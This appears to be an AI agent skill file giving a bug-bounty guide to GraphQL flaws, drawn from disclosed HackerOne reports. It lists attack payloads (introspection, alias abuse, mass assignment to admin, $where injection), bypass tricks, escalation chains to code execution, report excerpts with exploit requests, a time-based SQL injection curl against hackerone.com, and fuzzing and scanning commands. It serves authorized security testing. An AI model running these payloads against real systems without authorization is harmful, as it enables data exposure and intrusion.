---
name: hackerone-graphql
description: >-
  Hunt GraphQL authorization, introspection, and injection flaws. Use when testing /graphql endpoints, mutations, and federated schemas. Backed by 79 disclosed HackerOne reports.
---

# GraphQL Security — HackerOne field guide

Built from **79** publicly disclosed HackerOne reports (2017–2026). Corpus: `~/.local/share/hackerone-reports/`.

## Signal

- Reports: **79** · paid: **28**
- Median bounty **$2,250** · p90 **$7,000** · max **$25,000** · total **$89,172**
- Median upvotes **54**

## Where it pays

| Program | Reports | Bounty | Upvotes |
|---|---|---|---|
| HackerOne | 32 | $48,000 | 4532 |
| Shopify | 14 | $13,802 | 845 |
| Mozilla | 1 | $12,000 | 361 |
| GitLab | 7 | $7,370 | 275 |
| EXNESS | 1 | $3,000 | 261 |
| Mail.ru | 1 | $2,500 | 42 |
| New Relic | 4 | $750 | 16 |
| Tools for Humanity | 1 | $500 | 91 |

## Quick wins

Start here. These are the highest-yield tests for this class.

- Run introspection; if disabled, use field suggestions and error messages.
- Test object-level authz on every query and mutation.
- Look for nested traversal and alias/batch abuse.
- Test mass assignment on mutations and hidden/admin fields.
- Check injection in arguments passed to resolvers.

## Payloads & probes

- Introspection -> `{__schema{types{name fields{name}}}}`
- Alias abuse -> `{a:login(u:"a") b:login(u:"b")}`
- Mass assignment -> `mutation{updateUser(role:"admin"){id}}`
- Injection -> `filter: "{\"$where\":\"...\"}"`

## Bypass tricks

- Bypass depth/complexity limits with aliases or fragments.
- Use GET/query params when POST is blocked.
- Bypass authz with nested connections and node(id:) lookups.

## Where to look

Parameters, endpoints, and fields that commonly carry this bug:

`/graphql` `/api/graphql` `/v1/graphql` `node` `edges` `mutation`

## Tools

`graphql-voyager` · `InQL` · `GraphQLmap` · `clairvoyance`

## Escalation chains

- GraphQL IDOR -> PII.
- GraphQL injection -> RCE.
- Mutation mass assignment -> admin.

## Deeper checklist

- Run introspection; if disabled, use field suggestions and error messages to recover the schema.
- Test object-level authorization on every query and mutation, not just the UI-used ones.
- Look for nested traversal and batch/alias abuse to bypass rate limits.
- Test mass assignment on mutations and hidden/admin fields.
- Check injection in arguments passed to resolvers (SQL/NoSQL, SSRF, template).
- Probe depth/complexity limits and query batching for DoS.
- Verify cross-tenant data access with two accounts.

## Techniques from real reports

One concrete lesson per report (mined from the writeup), newest and most-upvoted first. Read 5–10 before testing.

- **Confidential data of users and limited metadata of programs and reports accessible via GraphQL** — `#489146` · HackerOne · $0 · ▲1033
  > The GraphQL endpoint doesn't have access controls implemented properly.
- **Email address of any user can be queried on Report Invitation GraphQL type when username is known** — `#792927` · HackerOne · $0 · ▲671
  > gid://hackerone/Report/626371 (here 626371 my test program's report id) convert it into base 64, replace that id with the "report id" in the above graphql query
- **Unauthenticated RCE in Taskcluster web-server via GraphQL filter argument (sift $where)** — `#3782701` · Mozilla · $12,000 · ▲361
  > The anonymous role has the required scopes. On `firefox-ci-tc` the `anonymous` role grants `auth:expand-scopes`, `auth:list-roles`, `auth:current-scopes`, and `hooks:list-hooks: `.
- **Private list members disclosure via GraphQL** — `#885539` · X / xAI · $0 · ▲346
  > Send requests to `https://api.█████████.com/graphql/iUmNRKLdkKVH4WyBNw9x2A/ListMembers?variables=%7B%22listId%22%3A%22[Valid Snowflake…
- **Disclosing  PolicyPageAssetGroup in Private Programs via /graphql `gid://hackerone/PolicyPageAssetGroupsIndex::PolicyPageAssetGroup/{id}`** — `#1618347` · HackerOne · $25,000 · ▲295
  > `{"query":"{node(id:\"gid://hackerone/PolicyPageAssetGroupsIndex::PolicyPageAssetGroup/3981-41287\"){...
- **SSRF in graphQL query (pwapi.ex2b.com)** — `#1864188` · EXNESS · $3,000 · ▲261
  > The query for `allTicks` allows setting the parameter `source` that is used to do `GET` requests, this can be set arbitrarily .
- **Github Apps can use Scoped-User-To-Server Tokens to Obtain Full Access to User's Projects in Project V2 GraphQL api** — `#1711938` · GitHub · $0 · ▲198
  > An incorrect authorization vulnerability was identified in GitHub Enterprise Server, allowing for escalation of privileges in GraphQL API requests from GitHub Apps.
- **IDOR on GraphQL queries BillingDocumentDownload and BillDetails** — `#2207248` · Shopify · $5,000 · ▲187
  > An IDOR on the `BillingInvoice` id on both `BillingDocumentDownload` and `BillDetails` graphql operations are leaking other merchants' ██████:
- **DOS via Mutation Aliasing in GraphQL Account Recovery Phone Number Verification API** — `#3287208` · HackerOne · $0 · ▲185
  > Send the request to the GraphQL endpoint with valid or dummy `verification code` and `otp code` variables.
- **Disclosure of `payment_transactions` for programs via GraphQL query** — `#707433` · HackerOne · $0 · ▲178
  > {"query":"query Team mini profile($handle 0:String!,$size 1:ProfilePictureSizes!) {team(handle:$handle 0) {id,...F0}} fragment F0 on Team {id,name,about, profile picturePkPpF:profile picture(size:$size 1),offers swag,offers bounties,base bounty,payment…
- **Authenticated Elasticsearch Painless script execution via Query.search.sort_query on hackerone.com/graphql** — `#3694007` · HackerOne · $7,000 · ▲174
  > Decoded internal ` id` values: `404547633`, `408446504`, `416737094`, `417300042`, `417467303` — monotonically ascending, confirming JSON sort directives are parsed and applied by Elasticsearch.
- **SQL injection in GraphQL endpoint through embedded_submission_form_uuid parameter** — `#435066` · HackerOne · $0 · ▲174
  > The `embedded submission form uuid` parameter in the `/graphql` endpoint is vulnerable to a SQL injection.
- **GraphQL AdminGenerateSessionPayload is leaked to staff with no permission** — `#898528` · Shopify · $0 · ▲173
  > This is a limited disclosure at the request of @hiffley.
- **Undocumented `fileCopy` GraphQL API** — `#981472` · Shopify · $2,000 · ▲157
  > the variables `absoluteKey` `key` and `path`values are the values of the file he uploaded in his store `storeB`
- **Team object in GraphQL disclosed private_comment** — `#978143` · HackerOne · $2,500 · ▲146
  > `{"data":{"node":{" id":"████████","pentester":null,"team":null,"key":"scope","private comment":"████","public comment":null,"rating":1,"recipient":null,"subject":null,"survey rating":{" id":"█████","team":null,"state":"completed","respondent":{"…
- **Bug in GraphQL and API integration leads to limited user address disclosure** — `#473742` · Starbucks · $0 · ▲144
  > The modified query resulted in a backend API request with undefined as a parameter.
- **Unauthorized user can obtain `report_sources` attribute through Team GraphQL object** — `#770209` · HackerOne · $2,500 · ▲142
  > `{"data":{"team":{" id":"█████████","report sources":["HackerOne Platform"]}}}` - `["HackerOne Platform"]` - private program
- **Private program disclosure via `vpn_suspended` GraphQL query** — `#715192` · HackerOne · $2,500 · ▲138
  > If an external program (which also has private program) has enabled VPN , then value of vpn suspended become false, so with this information, an attacker can find external programs which have private program, because there is no VPN feature in sandbox mode…
- **GraphQL field on Team node can be used to determine if External Program runs invite-only program** — `#877642` · HackerOne · $2,500 · ▲107
  > + Condition 1 - When an external program doesn't have any policy defined, `policy markdown html` will be `null`.
- **Team object in GraphQL disclosed total number of whitelisted hackers** — `#342978` · HackerOne · $2,500 · ▲93
  > `{"data":{"team":{"id":"Z2lkOi8vaGFja2Vyb25lL1RlYW0vMTM=","name":"HackerOne","handle":"security",
- **IDOR - Leaking of team data (name, email, ID, member ID) via POST /api/v1/graphql  `FetchMemberships` operation** — `#2381816` · Tools for Humanity · $500 · ▲91
  > An authorization bypass issue was identified and subsequently remediated in the `FetchMemberships` GraphQL operation.
- **CSRF on /api/graphql allows executing mutations through GET requests** — `#1122408` · GitLab · $3,370 · ▲88
  > Mutations are `edit` or `create` queries used in Graphql.
- **Cross-Tenant IDOR ( graphql `AddRulesToPixelEvents` query ) allowing to add, update, and delete rules of any Pixel events on the platform** — `#984965` · TikTok · $0 · ▲84
  > Through a single request the advertiser can Add and/or Modify and/or Delete Pixel events.
- **Private information exposed through GraphQL filters** — `#645299` · HackerOne · $0 · ▲81
  > When passing a where clause to a collection in the `graphql` endpoint, like `teams(where:{ state: { eq: soft launched}})` it queries the state through the secure schema - so it will not return any teams where the state does equal soft launched but you're not…
- **Insecure Direct Object Reference (IDOR) in GraphQL deleteProfileImages Mutation** — `#2968039` · Autodesk · $0 · ▲80
  > An IDOR (Insecure Direct Object Reference) vulnerability was found on Autodesk User Profile, through the "id" parameter which could have allowed an attacker to delete another user's photo.
- **Unauthenticated GraphQL access by prepending __schema to private operations** — `#3452015` · Enjin · $500 · ▲76
  > This security researcher went through an then located exactly where the vulnerability was introduced within the [platform-core](https://github.com/enjin/platform-core) repository so that a rapid fix could be introduced.
- **Team object in GraphQL discloses team group names and permissions** — `#343464` · HackerOne · $2,500 · ▲75
  > Because of the communications error, we can disclose the data - `team member groups{id,name,permissions}`
- **Team object in GraphQL disclosed of private programs via the industry** — `#707406` · HackerOne · $500 · ▲72
  > `{"data":{"team":{" id":"█████████","industry":"Computer Hardware \u0026 Peripherals"}}}`
- **Attachment object in GraphQL continues to grant access to files, even if they are removed from rendering** — `#1132606` · HackerOne · $0 · ▲66
  > In any case, we believe that when a client deletes a file from the page rendering(`{F number file}`), it deletes the path (link) to that file, i.e.
- **Image queue default key of 'None' and GraphQL unhandled type exception** — `#996041` · Reddit · $500 · ▲65
  > <a xlink:href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='alert(88)'%3E%3C/svg%3E" test 6</a

## Payload fragments observed

Recurring payloads from this class's writeups. Adapt, don't paste blindly.

| Seen | Fragment |
|---:|---|
| 7× | `$where` |
| 2× | `\\| Decoded` |
| 2× | `{F_number_file}` |
| 2× | `curl 'https://gitlab.com/api/graphql' -H 'Accept: application/json' -H 'Content-Type: application/json' -H 'Authorization: Bearer <<TOKEN>>` |
| 1× | `sift(filter)` |
| 1× | `In CSP mode, sift does not support strings in "$where" condition` |
| 1× | `new Function("obj", "return " + myString)` |
| 1× | `next()` |
| 1× | `curl -sk 'https://hackerone.com/graphql' -H @/tmp/h1.headers -b "$COOKIE" \ / --data-raw '{"query":"{me{_id username}}"}' \\| jq` |
| 1× | `(empty) \\| HTTP 500 /` |
| 1× | `edges { cursor node { id } }` |
| 1× | `source: "doc[\"_seq_no\"].value` |
| 1× | `sort_query: '[{"id":"asc"}]` |
| 1× | `doc[\"_seq_no\"].value` |
| 1× | `doc['<field>'].value` |
| 1× | `curl -X POST http://localhost:8080/graphql\?embedded_submission_form_uuid\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\(30\)%3B--%27` |
| 1× | `curl -X POST https://hackerone.com/graphql\?embedded_submission_form_uuid\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\(30\)%3B--%27` |
| 1× | `{"data":{"team":{"_id":"██████████","report_sources":[]}}}` |
| 1× | `{"data":{"team":{"_id":"█████","report_sources":["HackerOne Platform"]}}}` |
| 1× | `{"data":{"team":{"_id":"█████████","report_sources":["HackerOne Platform"]}}}` |

## Parameters observed

`operation` · `ssl` · `type` · `embedded_submission_form_uuid` · `variables` · `document_type` · `name` · `sentry_key` · `access_level` · `core_hacker_username` · `core_team_handle` · `query` · `sort` · `page`

## Case studies

### Confidential data of users and limited metadata of programs and reports accessible via GraphQL
`#489146` · HackerOne · $0 · critical · 2019-02-03 · ▲1033
> Summary: The GraphQL endpoint doesn't have access controls implemented properly. Description: Any attacker can get personally identifiable information of users of Hackerone such as email address, backup hash codes, facebook user id, account recovery phone number verified at, totp enabled, etc. These are just some examples of fields which are getting leaked directly from GraphQL.

### Email address of any user can be queried on Report Invitation GraphQL type when username is known
`#792927` · HackerOne · $0 · high · 2020-02-20 · ▲671
> Summary: Email id of all hackerone users disclosure Description: There is an flaw , with that i can get all hackerone users email id Steps To Reproduce 1. Invoke the below graphql call POST /graphql HTTP/1.1 you will get below response 2. to reproduce from your account, create one test program, and create one report for that program, get that report id gid://hackerone/Report/626371 (here 626371 my test program's report id) convert it into base 64, replace…

### IDOR - Delete all Licenses and certifications from users account using CreateOrUpdateHackerCertification GraphQL query
`#2122671` · HackerOne · $0 · high · 2023-08-29 · ▲395
> Summary: Hey team, While editing our Licenses and certifications if we change the ID number we can delete other users Licenses and certifications . it simply can be done by editing the ID number in our graphql query. If change the ID from 1 to X possible range then we can delete all the Licenses and certifications present between these. Steps To Reproduce 1. Log in to your own account in two browsers A and B with User A and User B 2.

### Unauthenticated RCE in Taskcluster web-server via GraphQL filter argument (sift $where)
`#3782701` · Mozilla · $12,000 · critical · 2026-08-05 · ▲361
> The public GraphQL endpoint at /graphql allows an unauthenticated caller to execute arbitrary JavaScript inside the web-server's Node.js process. The query argument filter is a free-form JSON object that the server passes directly into the sift library. The version in use (sift 17.1.3) compiles a $where string into a function using new Function and executes it.

### Private list members disclosure via GraphQL
`#885539` · X / xAI · $0 · low · 2020-08-04 · ▲346
> Summary: Due to improper queries of GraphQL, the attacker can steal members of the private list. Description: Twitter implements a unique GraphQL endpoint, which can use only the queries that Twitter specified. However, there is a flaw in the backend (https://api.████████.com/graphql/iUmNRKLdkKVH4WyBNw9x2A/ListMembers). This vulnerability requires snowflake brute-force, but it's not impossible.

## Wordlists

Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.

| File | Entries |
|---|---:|
| `~/.local/share/hackerone-reports/wordlists/paths_graphql.txt` | 64 |
| `~/.local/share/hackerone-reports/wordlists/params_graphql.txt` | 14 |
| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |
| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |

```sh
W=~/.local/share/hackerone-reports/wordlists
ffuf -u https://target/FUZZ -w $W/paths_graphql.txt \
     -mc all -fc 404 -fs 0 -rate 40
ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_graphql.txt \
     -mr 'canary|error|invalid|not found' -rate 40
```

## Nuclei

Run introspection and authz tests by hand; templates mostly fingerprint servers and known CVEs.

```sh
nuclei -u https://target -tags graphql \
       -severity low,medium,high,critical -rl 40 -o nuclei_graphql.txt
nuclei -u https://target -t ~/nuclei-templates/http/technologies/graphql \
       -rl 40 -o nuclei_graphql_graphql.txt
nuclei -u https://target -t ~/nuclei-templates/http/vulnerabilities/other \
       -rl 40 -o nuclei_graphql_other.txt
# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'
```

Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.

## Query the corpus

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "<keyword>" --class graphql --limit 20
python3 ~/.local/share/hackerone-reports/h1.py stats --class graphql
python3 ~/.local/share/hackerone-reports/h1.py show <id> --full
```

Search by technology, endpoint, parameter, or program. Examples:

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "wordpress" --class graphql
python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class graphql --min-bounty 1000
```

## Related

- `hackerone-idor` (450 reports)
- `hackerone-authz-bypass` (1,386 reports)
- `hackerone-sqli` (331 reports)

## Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.
